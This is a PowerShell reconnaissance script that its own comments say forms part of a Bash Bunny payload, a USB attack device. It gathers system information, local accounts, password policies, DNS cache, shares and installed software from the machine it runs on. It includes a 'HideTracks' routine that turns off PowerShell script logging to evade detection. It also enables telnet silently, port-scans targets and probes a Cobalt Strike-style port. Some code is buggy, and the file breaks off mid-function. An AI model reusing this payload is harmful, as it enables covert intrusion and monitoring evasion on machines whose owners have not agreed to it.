<#
	.SYNOPSIS
		This function gathers configuration and security information from the
        local machine and the network it is attached to.
	.DESCRIPTION
		System and network gathering tool
	.NOTES
		The code is used as part of the payload on a Bash Bunny.
	.PARAMETER
        None
	.EXAMPLE
		
#>

    function HideTracks
    {
        $PS_Logging_Path = "\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\"

        if (Test-Path "HKLM:$PS_Logging_Path" )
        {
            $PS_Logging_Status = Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\PowerShell\* | Select EnableScriptBlockLogging
            if($PS_Logging_Status.EnableScriptBlockLogging -eq 1)
            {
                Set-ItemProperty 'HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockInvocationLogging -value 0
                $global:PS_ScriptLogging = $True
            }
        }

        Set-ItemProperty 'HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name EnableScriptBlockInvocationLogging -value 0

    }

    Function Admin_Check
    {
        If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
        {
            Return $false
        }
        else
        {
            Return $True
        }
    }

    function InstallTelnet
    {
        $TelnetInstalled = get-childitem -path C:\windows\system32\ *telnet.exe -file -recurse -erroraction SilentlyContinue

        if ($TelnetInstalled.length -eq 0)
        {
            $TelnetExists = Get-WindowsOptionalFeature -online -FeatureName TelnetClient

            if ($TelnetExists.count -eq 0)
            {
                dism /online /Enable-Feature /FeatureName:TelnetClient
            }
        }
    }

    function DirCheck
    {
        <#
	    .SYNOPSIS
		    This function checks to see if c:\temp exists and if it does not, it creates it.
	    .DESCRIPTION
		    Checks for C:\temp
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE	
        #>

        if (!(Test-Path 'c:\temp\'))
        {
            new-item -itemtype directory c:\temp
            Return $True
        }
        if (Test-Path $global:CurFName)
        {
            Remove-Item $global:CurFName
        }
        return $False
    }

    function GetSysInfo
    {
        <#
	    .SYNOPSIS
		    This function gathers the system information output.
	    .DESCRIPTION
		    Run systeminfo
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nSystem Information - System Info" | out-file -append $global:CurFName
        systeminfo | out-file -append $global:CurFName
        Write-Output "End of System Info" | out-file -append $global:CurFName
    }

    function GetNetShares
    {
        <#
	    .SYNOPSIS
		    This function gathers the current network shares.
	    .DESCRIPTION
		    Run net use
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nNetwork Shares - Net Use" | out-file -append $global:CurFName
        net use | out-file -append $global:CurFName
        Write-Output "End of Net Use" | out-file -append $global:CurFName
    }

    function GetInstalledApps
    {
        <#
	    .SYNOPSIS
		    This function gathers the installed applications.
	    .DESCRIPTION
		    Gather installed applications from registry.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nInstalled Applications" | out-file -append $global:CurFName
        $64bitApps = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -and !$_.SystemComponent -and !$_.ReleaseType -and !$_.ParentKeyName -and ($_.UninstallString -or $_.NoRemove) }
        $32bitApps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -and !$_.SystemComponent -and !$_.ReleaseType -and !$_.ParentKeyName -and ($_.UninstallString -or $_.NoRemove) }
        $AllApps = $64bitApps + $32bitApps
        $AllApps | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | ft -AutoSize | out-file -append $global:CurFName
        type C:\windows\system32\drivers\etc\hosts | out-file -append $global:CurFName
        Write-Output "End of Installed Applications" | out-file -append $global:CurFName
    }

    function GetHostsFile
    {
        <#
	    .SYNOPSIS
		    This function lists the contents of the Hosts file.
	    .DESCRIPTION
		    Gather the information in the host file.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nHost File" | out-file -append $global:CurFName
        type C:\windows\system32\drivers\etc\hosts | out-file -append $global:CurFName
        Write-Output "End of IHost File" | out-file -append $global:CurFName
    }

    function GetAccountPolicies
    {
        <#
	    .SYNOPSIS
		    This function gathers the account policies.
	    .DESCRIPTION
		    Run net accounts.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nAccount Policies - net accounts" | out-file -append $global:CurFName
        net accounts | out-file -append $global:CurFName
        Write-Output "End of net accounts" | out-file -append $global:CurFName
    }

    function GetLocalAccounts
    {
        <#
	    .SYNOPSIS
		    This function gathers the local accounts.
	    .DESCRIPTION
		    Run get-localuser.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nLocal Users - get-localuser" | out-file -append $global:CurFName
        get-localuser | Select * | out-file -append $global:CurFName
        Write-Output "End of get-localuser" | out-file -append $global:CurFName
    }

    function GetNetConfig
    {
        <#
	    .SYNOPSIS
		    This function gathers the network configuration.
	    .DESCRIPTION
		    Run ipconfig /all.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nNetwork Configuration - Ipconfig /all" | out-file -append $global:CurFName
        ipconfig /all | out-file -append $global:CurFName
        Write-Output "End of Ipconfig /all" | out-file -append $global:CurFName
    }

    function GetDNSCache
    {
        <#
	    .SYNOPSIS
		    This function gathers the local DNS Cache.
	    .DESCRIPTION
		    Run ipconfig /displaydns.
	    .NOTES
		    The code is used as part of the payload on a Bash Bunny.
	    .PARAMETER
            None
	    .EXAMPLE
        #>

        Write-Output "`nDNS Cache - Ipconfig /displaydns" | out-file -append $global:CurFName
        ipconfig /displaydns | out-file -append $global:CurFName
        Write-Output "End of Ipconfig /displaydns" | out-file -append $global:CurFName
    }

    function Disc_IP
    {
	    <#
	    .SYNOPSIS
		    This function scans an IP address for open ports and information about those ports.
	    .DESCRIPTION
		    Scans an IP address for open ports and information about those ports.
	    .NOTES
		    The RISK scan is only available in Windows PowerShell (version 5.1).
            The scan feature for HTTP and HTTPS is better in PowerShell version 7.
	    .PARAMETER Computername
		    IP address to scan.
	    .PARAMETER DiscType
            Type of scan to run
                FULL   - Perform SCAN, RISK, and DNS discoveries
                SCAN   - Perform basic port scan of IP address (default)
                RISK   - Analyze reputation websites for information on IP address
                DNS    - Perform ping, trace route, and DNS resolution of the IP address
	    .PARAMETER TRDNS
            Include or do not include DNS resolution during trace route
                YES    - Include DNS resolution during trace route
                NO     - Do not include DNS resolution during trace route (default)
	    .EXAMPLE
		    PS> DiscIP -IPAddress 199.96.21.41
		
		    This example scans the IP address using a DiscType of SCAN and TRDNS of NO.
        
            PS> DiscIP -IPAddress 199.96.21.41 -DiscType FULL -TRDNS YES

            This example scans the IP address using a DiscType of FULL and TRDNS of YES
	    #>

        param ( 
                [Parameter(Mandatory=$true, Position=0)]
                [String]$IPAddress,
                [Parameter(Mandatory=$false, Position=1)]
                [validateset('FULL','DNS','SCAN','RISK')]
                [String]$DiscType = 'SCAN',
                [Parameter(Mandatory=$false, Position=2)]
                [validateset('YES','NO')]
                [String]$TRDNS = 'NO',
                [Parameter(Mandatory=$false, Position=3)]
                [validateset('FILE','NOFILE')]
                [String]$S2File = 'NOFILE'
              )

        $global:TCP_Ports = @('21','22','23','25','80','389','443','445','1433','3389','5101','5353','5355','5900','5938','5985','5986','8000','9100','42981','50050')
        $global:TCP_PortName = @('FTP','SSH','Telnet','SMTP','HTTP','LDAP','SSL (HTTPS)','SMB/CIFS','SQL','RDP','RDP','mDNS','LLMNR','VNC','TeamViewer','WinRM','WinRM','HTTP','Print','RDP','CSTmSvr')
        $global:UDP_Ports = @('53','67','88','123','137','161','389','5353','5355')
        $global:UDP_PortName = @('DNS','DHCP','Kerberos','NTP','NetBIOS''SNMP','LDAP','mDNS','LLMNR')
        $global:LinuxDistros = @('Android','Debian','GNU/Linux','Fedora','openSUSE','Red Hat','Slackware','SUSE','Ubuntu','Arch','CentOS','Gentoo','KNOPPIX','Mint','Mageia','Oracle','Scientific','Raspbian','Kali','ParrotOS','BackBox','BlackArch','CAINE','CensorNet','CLIP OS','Copperhead OS','Cyborg Hawk','DEFT','Security Onion','Sophos')

        $global:ProgressPreference = 'SilentlyContinue'

        # Program Versioning Information
        $global:DiscIPVersion = "1.0.20210919"
        $global:BuildDate = "09/19/2021"

        $TempHost = $IPAddress

        if ([ipaddress]::TryParse($IPAddress,[ref][ipaddress]::Loopback))
        {
            $SplitIP = $IPAddress.split('.')
        }
        else
        {
            $IPAddress = [System.Net.Dns]::GetHostEntry($TempHost).AddressList.IPAddressToString
            $SplitIP = $IPAddress.split('.')
        }

        $NetLoc = IPType($IPAddress)
        $output_string = ""

        if ($S2File -eq "FILE")
        {
            Write-Output "Pinging $IPAddress...Successful." | out-file -append $global:CurFName
        }
<#
            if ($TRDNS.ToUpper() -eq "YES" -or $TRDNS.ToUpper() -eq "Y")
            {
                Write-Host "Performing Trace Route WITH DNS to $IPAddress..."
    
                if ($S2File -eq "FILE")
                {
                    Write-Output "Performing Trace Route WITH DNS to $IPAddress..." | out-file -append $global:CurFName
                }
            }
            else
            {
                #Write-Host "Performing Trace Route without DNS to $IPAddress..."

                if ($S2File -eq "FILE")
                {
                    Write-Output "Performing Trace Route without DNS to $IPAddress..." | out-file -append $global:CurFName
                }
            }
            $TraceRoute = test-netconnection -computername $IPAddress -TraceRoute -Hops 15

            foreach ($item in $TraceRoute.TraceRoute)
            {
                if ($TRDNS.ToUpper() -eq "YES" -or $TRDNS.ToUpper() -eq "Y")
                {
                    $ResolveEachHop = Resolve-DnsName $Item -ErrorAction Ignore |Select-Object -exp NameHost
                    if ($ResolveEachHop.Length -eq 0)
                    {
                        $ResolveEachHop = $item
                    }
                }
                else
                {
                    $ResolveEachHop = $item
                }
                $TempVar = [ordered]@{
                    IPAddress = $item
                    DNSName = $ResolveEachHop
                }
                $PSObject = new-object -TypeName PSObject -Property $TempVar
                $FinalTR += $PSObject
            }

            $temp_output_string = ""

            foreach ($rec in $FinalTR)
            {
                if ($TRDNS.ToUpper() -eq "YES" -or $TRDNS.ToUpper() -eq "Y")
                {
                    #write-host "  ==> "$rec.IPAddress" <> "$rec.DNSName
                    $temp_output_string = $temp_output_string + $rec.IPAddress + " <> " + $rec.DNSName + " "

                    if ($S2File -eq "FILE")
                    {
                        Write-Output "  ==> "+$rec.IPAddress+" <> "+$rec.DNSName | out-file -append $global:CurFName
                    }
                }
                else
                {
                    #write-host "  ==> "$rec.IPAddress
                    $temp_output_string = $temp_output_string + $rec.IPAddress + " "

                    if ($S2File -eq "FILE")
                    {
                        Write-Output "  ==> "+$rec.IPAddress | out-file -append $global:CurFName
                    }
                }
            }
            $output_string = $output_string + [char]34 + $temp_output_string + [char]34 + ","
#>

        $Resolvable = Resolve-DnsName $IPAddress -ErrorAction Ignore |Select-Object -exp NameHost

        if ($Resolvable.Length -gt 0)
        {
            #Write-Host -nonewline "Successful ($Resolvable)." -ForegroundColor Green -Separator " ==> "
            $output_string = $output_string + [char]34 + $Resolvable + [char]34 + ","

            if ($S2File -eq "FILE")
            {
                Write-Output "DNS Resolution for $IPAddress ($Resolvable)...Successful." | out-file -append $global:CurFName
            }
        }
        else
        {
            #Write-Host -nonewline "Failed." -ForegroundColor Red -Separator " ==> "
            $output_string = $output_string + [char]34 + "Failed" + [char]34 + ","

            if ($S2File -eq "FILE")
            {
                Write-Output "DNS Resolution for $IPAddress...Failed." | out-file -append $global:CurFName
            }
        }

        $TelnetInstalled = get-childitem -path C:\windows\system32\ *telnet.exe -file -recurse -erroraction SilentlyContinue

        if ($DiscType -eq "Full" -or $DiscType -eq "Scan")
        {
            $ListCount = 0
            $global:TCP_Ports.split(',') | Foreach-Object -Process {
                                                                        $PrtNames = $global:TCP_PortName.split(',')
                                                                        $CurPort = $PrtNames[$ListCount]
                                                                        #write-host -nonewline "  Scanning TCP port $_ $CurPort on $IPAddress..."
                                                                        #Write-Progress -Activity "  Scanning TCP port $_ on $IPAddress..." -Status "Scanning"

                                                                        $ListCount ++

                                                                        $global:timer = [System.Diagnostics.Stopwatch]::StartNew()

                                                                        #If (($a=Test-NetConnection $IpAddress -Port $_ -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true)
                                                                        If (($a=Test-Port-Quick -ComputerName $IpAddress -Protocol 'TCP' -Port $_).Result -eq $true)
                                                                        {
                                                                            #Write-Host "Open" -ForegroundColor Green -Separator " ==> "
                                                                    
                                                                            if ($S2File -eq "FILE")
                                                                            {
                                                                                Write-Output  "Scanning TCP port $_ $CurPort on $IPAddress...Open." | out-file -append $global:CurFName
                                                                            }

                                                                            Switch ($_)
                                                                            {
                                                                                "21" {
                                                                                        #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                        $PortFunction = TelnetDisc -PortNum $_ -IPAddr $IPAddress
                                                                                        #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow
                                                                                        $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                        #Write-Host -nonewline " Completed"

                                                                                        if ($S2File -eq "FILE")
                                                                                        {
                                                                                            Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                        }
                                                                                    }
                                                                                "22" {
                                                                                        #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                        $PortFunction = TelnetDisc -PortNum $_ -IPAddr $IPAddress
                                                                                        #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow
                                                                                        $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                        #Write-Host -nonewline " Completed"

                                                                                        if ($S2File -eq "FILE")
                                                                                        {
                                                                                            Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                        }
                                                                                        }
                                                                                "23" {
                                                                                        #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                        $PortFunction = TelnetDisc -PortNum $_ -IPAddr $IPAddress
                                                                                        #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow
                                                                                        $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                        #Write-Host -nonewline " Completed"
                                                                                        }
                                                                                "25" {
                                                                                        #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                        $PortFunction = TelnetDisc -PortNum $_ -IPAddr $IPAddress
                                                                                        #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow
                                                                                        $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                        #Write-Host -nonewline " Completed"

                                                                                        if ($S2File -eq "FILE")
                                                                                        {
                                                                                            Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                        }
                                                                                        }
                                                                                "80" {
                                                                                        #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                        try
                                                                                        {
                                                                                            if ($host.version.major -lt 7)
                                                                                            {
                                                                                                $Response = Invoke-WebRequest -Uri "$IPAddress/bogus.html"
                                                                                                # This will only execute if the Invoke-WebRequest is successful.
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                $Response = Invoke-WebRequest -Uri "$IPAddress/bogus.html" -SkipHttpErrorCheck -skipcertificatecheck
                                                                                            }
                                                                                            $StatusCode = $Response.StatusCode
                                                                                            $StatusDescription = $Response.StatusDescription
                                                                                            $RawContent = ($Response.RawContent -split '\n')[0..5]
                                                                                        }
                                                                                        catch
                                                                                        {
                                                                                            if ($host.version.major -lt 7)
                                                                                            {
                                                                                                $StatusCode = $Error[0].ErrorDetails.Message
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                $StatusCode = $Response.StatusCode
                                                                                                $StatusDescription = $Response.StatusDescription
                                                                                                $RawContent = ($Response.RawContent -split '\n')[0..5]
                                                                                                $Headers = $Response.Headers
                                                                                            }
                                                                                        }

                                                                                        $PortFunction = $StatusCode

                                                                                        if ($host.version.major -lt 7)
                                                                                        {
                                                                                            #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow

                                                                                            if ($S2File -eq "FILE")
                                                                                            {
                                                                                                Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                            }
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                            #Write-host -nonewline " "$PortFunction":"$StatusDescription"`r`n" -ForegroundColor Yellow
                                                                                            #Write-host ($RawContent -join "`n") -ForegroundColor Yellow

                                                                                            if ($S2File -eq "FILE")
                                                                                            {
                                                                                                Write-Output  "    Interrogating TCP Port $_ $CurPort..." "$PortFunction":"$StatusDescription"`r`n"$RawContent Completed." | out-file -append $global:CurFName
                                                                                            }
                                                                                        }

                                                                                        $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                        #Write-Host -nonewline " Completed"

                                                                                        if ($S2File -eq "FILE")
                                                                                        {
                                                                                            Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                        }
                                                                                        }
                                                                                "443" {
                                                                                        #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                        $PortFunction = Get-PublicKey -Uri "https://$IPAddress"
                                                                                        #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow
                                                                                        $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                        #Write-Host -nonewline " Completed"

                                                                                        if ($S2File -eq "FILE")
                                                                                        {
                                                                                            Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                        }
                                                                                        }
                                                                                "445" {$ScanType = "URG"}
                                                                                "1433" {$ScanType = "URG"}
                                                                                "3389" {$ScanType = "RST"}
                                                                                "5985" {
                                                                                            #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                            $PortFunction = "WinRM is not present"
                                                                                            if ($Resolvable.Length -gt 0)
                                                                                            {
                                                                                                Try
                                                                                                {
                                                                                                    $WinRMAnswer = Test-WSMan -computername $Resolvable
                                                                                                    $PortFunction = $WinRMAnswer.ProductVendor+" => WSMan is available."
                                                                                                    $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                                }
                                                                                                catch
                                                                                                {
                                                                                                    $PortFunction = "WinRM is not present"
                                                                                                }
                                                                                            }
                                                                                            #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow
                                                                                            #Write-Host -nonewline " Completed"

                                                                                            if ($S2File -eq "FILE")
                                                                                            {
                                                                                                Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                            }
                                                                                        }
                                                                                "8000" {
                                                                                        #Write-Host -nonewline "    Interrogating TCP Port $_ $CurPort..."
                                                                                        try
                                                                                        {
                                                                                            if ($host.version.major -lt 7)
                                                                                            {
                                                                                                $URI = $IPAddress + ":" + $_ + "/bogus.html"
                                                                                                $Response = Invoke-WebRequest -Uri $URI
                                                                                                # This will only execute if the Invoke-WebRequest is successful.
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                $URI = $IPAddress + ":" + $_ + "/bogus.html"
                                                                                                $Response = Invoke-WebRequest -Uri $URI -SkipHttpErrorCheck -skipcertificatecheck
                                                                                                # This will only execute if the Invoke-WebRequest is successful.
                                                                                            }

                                                                                            $StatusCode = $Response.StatusCode
                                                                                            $StatusDescription = $Response.StatusDescription
                                                                                            $RawContent = ($Response.RawContent -split '\n')[0..5]
                                                                                        }
                                                                                        catch
                                                                                        {
                                                                                            if ($host.version.major -lt 7)
                                                                                            {
                                                                                                $StatusCode = $Error[0].ErrorDetails.Message
                                                                                            }
                                                                                            else
                                                                                            {
                                                                                                $StatusCode = $Response.StatusCode
                                                                                                $StatusDescription = $Response.StatusDescription
                                                                                                $Headers = $Response.Headers
                                                                                                $RawContent = ($Response.RawContent -split '\n')[0..5]
                                                                                            }
                                                                                        }

                                                                                        $PortFunction = $StatusCode

                                                                                        if ($host.version.major -lt 7)
                                                                                        {
                                                                                            #Write-host -nonewline " "$PortFunction -ForegroundColor Yellow

                                                                                            if ($S2File -eq "FILE")
                                                                                            {
                                                                                                Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                            }
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                            #Write-host -nonewline " "$PortFunction":"$StatusDescription"`r`n" -ForegroundColor Yellow
                                                                                            #Write-host ($RawContent -join "`n") -ForegroundColor Yellow

                                                                                            if ($S2File -eq "FILE")
                                                                                            {
                                                                                                Write-Output  "    Interrogating TCP Port $_ $CurPort...$PortFunction Completed." | out-file -append $global:CurFName
                                                                                            }
                                                                                        }

                                                                                        $PortAnalysis = Port_Analysis -PortFunc $PortFunction
                                                                                        #Write-Host -NoNewline " Completed"
                                                                                        }

                                                                                "50050" {
                                                                                            #wget -U "Internet Explorer" http://$IPAddress/vl6D
                                                                                            invoke-webrequest -Uri "http://$IPAddress/vl6D"
                                                                                        }
                                                                            }
                                                                        }
                                                                        else
                                                                        {
                                                                            #Write-Host -NoNewline "Closed" -Separator " ==> " -ForegroundColor Red

                                                                            if ($S2File -eq "FILE")
                                                                            {
                                                                                Write-Output  "Scanning TCP port $_ $CurPort on $IPAddress...Closed." | out-file -append $global:CurFName
                                                                            }
                                                                        }
                                                                    }
        }
    }

    function AdapterInfo
    {
        get-NetAdapter | where { $_.Status -eq "Up" -and $_.ifDesc -like "*Hyper-V*" } | foreach-object {
            $Adapter_Status = $_.Status
            $IFName = $_.InterfaceAlias
            $IP_Addr = ""
            Get-NetIPAddress -InterfaceAlias $IFName | where { $_.IPAddress -like "*.*.*.*" } | foreach-object {
                if ($IP_Addr.length -lt 3)
                {
                    $IP_Addr = $_.IPAddress
                    $CIDR = $_.PrefixLength
                }
                else
                {
                    $IP_Addr = $IP_Addr + " ," + $_.IPAddress
                }
            }
            $TempVar = [ordered]@{
                #Status = $Adapter_Status
                #Name = $IFName
                IP_Address = $IP_Addr
                Subnet = $CIDR
                #DualHomed_Status = $False
                #Audit_Finding = "System is correctly configured."
                #Recommendation = ""
            }
            $PSObject = new-object -TypeName PSObject -Property $TempVar
            return $PSObject
        }
    }

    function Get-PublicKey
    {
        [OutputType([byte[]])]
        PARAM (
            [Uri]$Uri
        )

        if (-Not ($uri.Scheme -eq "https"))
        {
            Write-Error "You can only get keys for https addresses"
            return
        }

        $request = [System.Net.HttpWebRequest]::Create($uri)

        try
        {
            #Make the request but ignore (dispose it) the response, since we only care about the service point
            $request.GetResponse().Dispose()
        }
        catch [System.Net.WebException]
        {
            if ($_.Exception.Status -eq [System.Net.WebExceptionStatus]::TrustFailure)
            {
                #We ignore trust failures, since we only want the certificate, and the service point is still populated at this point
            }
            else
            {
                #Let other exceptions bubble up, or write-error the exception and return from this method
                #throw
            }
        }

        #The ServicePoint object should now contain the Certificate for the site.
        $Subject = $request.ServicePoint.Certificate.Subject
        if ($Subject.length -gt 2)
        {
            $Test = @($Subject.Split(','))

            $cnt = 0

            Do
            {
                if ($Test[$cnt] -like "*O=*")
                {
                    Return $Test[$cnt]
                }
                $cnt++
            }
            while ($cnt -le $Test.count)

            $servicePoint = $request.ServicePoint
            $key = $servicePoint.Certificate.GetPublicKey()
        }
    }

    function IPType
    {        
        PARAM (
                [string]$IPAddr
              )
        
        $NetLoc = "Local"
        $SplitIP = $IPAddr.split('.')
        #write-host $IPAddr

        if ([int]$SplitIP[0] -ne 10 -and $IPAddr -ne '127.0.0.1' -and [int]$SplitIP[0] -ne 224 -and [int]$SplitIP[0] -ne 169)
        {
            if ([int]$SplitIP[0] -eq 192 -or [int]$SplitIP[0] -eq 172)
            {
                If ([int]$SplitIP[0] -eq 192 -and [int]$SplitIP[1] -ne 168)
                {
                    $NetLoc = "Internet"
                }
                else
                {
                    If ([int]$SplitIP[0] -eq 172 -and ([int]$SplitIP[1] -lt 12 -or [int]$SplitIP[1] -gt 31))
                    {
                        $NetLoc = "Internet"
                    }
                }
            }
            else
            {
                $FoundIPSpace = $False

                foreach ($OIP in $global:OwnedIPSpace)
                {
                    #write-host "IPAddress: $IPAddr"
                    #Write-host "OwendIP : $OIP"
                    $SplitOwnedIP = $OIP.Split('.')

                    if ($SplitIP[0] -eq $SplitOwnedIP[0] -and $SplitIP[1] -eq $SplitOwnedIP[1] -and $SplitIP[2] -eq $SplitOwnedIP[2])
                    {
                        $FoundIPSpace = $True
                    }
                }
                if($FoundIPSpace)
                {
                    $NetLoc = "Local"
                }
                else
                {
                    $NetLoc = "Internet"
                }
            }
        }
        else
        {
            if ([int]$SplitIP[0] -eq 169 -and [int]$SplitIP[1] -ne 254)
            {
                $NetLoc = "Internet"
            }
            else
            {
                if([int]$SplitIP[0] -eq 224 -or [int]$SplitIP[3] -eq 255)
                {
                    $NetLoc = "Broadcast"
                }
            }
        }
        Return $NetLoc
    }

    function TelnetDisc
    {
        PARAM ([string]$PortNum,[string]$IPAddr)

        # Setup the Process startup info
        $pinfo = New-Object System.Diagnostics.ProcessStartInfo 
        $pinfo.FileName = "telnet.exe" 
        $pinfo.Arguments = "-f c:\temp\telnet.log $IPAddr $PortNum" 
        $pinfo.UseShellExecute = $false
        $pinfo.CreateNoWindow = $true 
        $pinfo.RedirectStandardOutput = $false
        $pinfo.RedirectStandardError = $false

        # Create a process object using the startup info
        $process= New-Object System.Diagnostics.Process 
        $process.StartInfo = $pinfo

        # Start the process 
        $process.Start() | Out-Null
        # Wait a while for the process to do something 
        Start-Sleep -Seconds 5

        # If the process is still active kill it 
        if (!$process.HasExited) 
        { 
	        $process.Kill() 
        }
        $PortFunc = Get-Content -path C:\temp\telnet.log

        #Write-host "    "$PortFunction
                            
        Return $PortFunc
    }

    Function Port_Analysis
    {
        PARAM ([string]$PortFunc)

        foreach ($Distro in $global:LinuxDistros)
        {
            if ($PortFunc -like "*$Distro*")
            {
                if ($PortAnalysis.length -eq 0)
                {
                    $PortAnalysis = $Distro
                }
                else
                {
                    $PortAnalysis = $PortAnalysis + ", " + $Distro
                }
            }
        }
        Return $PortAnalysis
    }

    function Test-Port-Quick
    {
	    <#
	    .SYNOPSIS
		    This function tests for open TCP/UDP ports.
	    .DESCRIPTION
		    This function tests any TCP/UDP port to see if it's open or closed.
	    .NOTES
		    Known Issue: If this function is called within 10-20 consecutively on the same port
			    and computer, the UDP port check will output $false when it can be
			    $true.  I haven't figured out why it does this.
	    .PARAMETER Computername
		    One or more remote, comma-separated computer names
	    .PARAMETER Port
		    One or more comma-separated port numbers you'd like to test.
	    .PARAMETER Protocol
		    The protocol (UDP or TCP) that you'll be testing
	    .PARAMETER TcpTimeout
		    The number of milliseconds that the function will wait until declaring
		    the TCP port closed.
	    .PARAMETER
		    The number of millieconds that the function will wait until declaring
		    the UDP port closed.
	    .EXAMPLE
		    PS> Test-Port -Computername 'LABDC','LABDC2' -Protocol TCP 80,443
		
		    This example tests the TCP network ports 80 and 443 on both the LABDC
		    and LABDC2 servers.
	    #>
	    [CmdletBinding(DefaultParameterSetName='TCP')]
	    [OutputType([System.Management.Automation.PSCustomObject])]
	    param (
		    [Parameter(Mandatory)]
		    [string[]]$ComputerName,
		    [Parameter(Mandatory)]
		    [int[]]$Port,
		    [Parameter(Mandatory)]
		    [ValidateSet('TCP', 'UDP')]
		    [string]$Protocol,
		    [Parameter(ParameterSetName='TCP')]
		    [int]$TcpTimeout = 1000,
		    [Parameter(ParameterSetName = 'UDP')]
		    [int]$UdpTimeout = 1000
	    )
	    process {
		    foreach ($Computer in $ComputerName) {
			    foreach ($Portx in $Port) {
				    $Output = @{ 'Computername' = $Computer; 'Port' = $Portx; 'Protocol' = $Protocol; 'Result' = '' }
				    Write-Verbose "$($MyInvocation.MyCommand.Name) - Beginning port test on '$Computer' on port '$Protocol<code>:$Portx'"
				    if ($Protocol -eq 'TCP') {
					    $TcpClient = New-Object System.Net.Sockets.TcpClient
					    $Connect = $TcpClient.BeginConnect($Computer, $Portx, $null, $null)
					    $Wait = $Connect.AsyncWaitHandle.WaitOne($TcpTimeout, $false)
					    if (!$Wait) {
						    $TcpClient.Close()
						    Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' failed port test on port '$Protocol</code>:$Portx'"
						    $Output.Result = $false
					    } else {
						    $TcpClient.EndConnect($Connect)
						    $TcpClient.Close()
						    Write-Verbose "$($MyInvocation.MyCommand.Name) - '$Computer' passed port test on port '$Protocol<code>:$Portx'"
						    $Output.Result = $true
					    }
					    $TcpClient.Close()
					    $TcpClient.Dispose()
				    } elseif ($Protocol -eq 'UDP') {
					    $UdpClient = New-Object System.Net.Sockets.UdpClient
					    $UdpClient.Client.ReceiveTimeout = $UdpTimeout
					    $UdpClient.Connect($Computer, $Portx)
					    Write-Verbose "$($MyInvocation.MyCommand.Name) - Sending UDP message to computer '$Computer' on port '$Portx'"
					    $a = new-object system.text.asciiencoding
					    $byte = $a.GetBytes("$(Get-Date)")
					    [void]$UdpClient.Send($byte, $byte.length)
					    #IPEndPoint object will allow us to read datagrams sent from any source.
					    Write-Verbose "$($MyInvocation.MyCommand.Name) - Creating remote endpoint"
					    $remoteendpoint = New-Object system.net.ipendpoint([system.net.ipaddress]::Any, 0)
					    try {
						    #Blocks until a message returns on this socket from a remote host.
